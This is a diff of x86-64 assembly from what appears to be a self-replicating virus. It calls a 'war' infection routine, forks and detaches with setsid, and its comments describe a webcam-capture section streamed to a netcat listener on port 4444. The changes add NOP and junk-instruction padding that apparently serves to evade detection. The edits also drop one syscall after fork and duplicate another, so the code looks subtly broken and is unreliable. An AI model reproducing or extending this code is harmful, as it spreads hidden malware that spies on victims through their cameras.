@@ -10,6 +10,7 @@ end_:
 
 
 
+
 	%include "functions/check_forbidden.s"
 	cmp rax, 1
 	jne end_0
@@ -26,19 +27,26 @@ end_:
 	syscall
 
 
-
 	%include "warf.s"
 
 
 
 end_0:
+	NOP
+	mov		rax, 69548
+	NOP
 	call	war
+	NOP
+	mov		rax, 89787
+	NOP
 
-
+	NOP
 	mov		rax, SYS_open
+	NOP
 
 	mov		rdi, [rbp + 16]
 	add		rdi, mydata.self
+
 
 	;lea		rdi, [rel self]
 	xor		rsi, rsi
@@ -52,6 +60,9 @@ end_0:
 	NOP
 	NOP
 	syscall
+
+
+
 
 	cmp		rax, 0
 	jle		.just_quit
@@ -73,13 +84,15 @@ end_0:
 	syscall
 
 
+
 	.just_quit:
 
 		mov		rax, SYS_fork
-		syscall
 
 		cmp		eax, 0
 		jng		.continue_fork
+
+
 
 		mov		rax, SYS_exit
 		xor		rdi, rdi
@@ -90,14 +103,16 @@ end_0:
 		syscall
 
 	.continue_fork:
+
 		mov		rax, SYS_setsid
 		syscall
-
+			syscall
 
 		; Ici commence la partie pour la cam
 		; ffplay -f mjpeg -framerate 30 -i <nomdufichier>
 		; c'est la commande que j'utilise avec
 		; nc -lvnp 4444
+
 		mov		rax, SYS_open
 
 		mov		rdi, [rbp + 16]
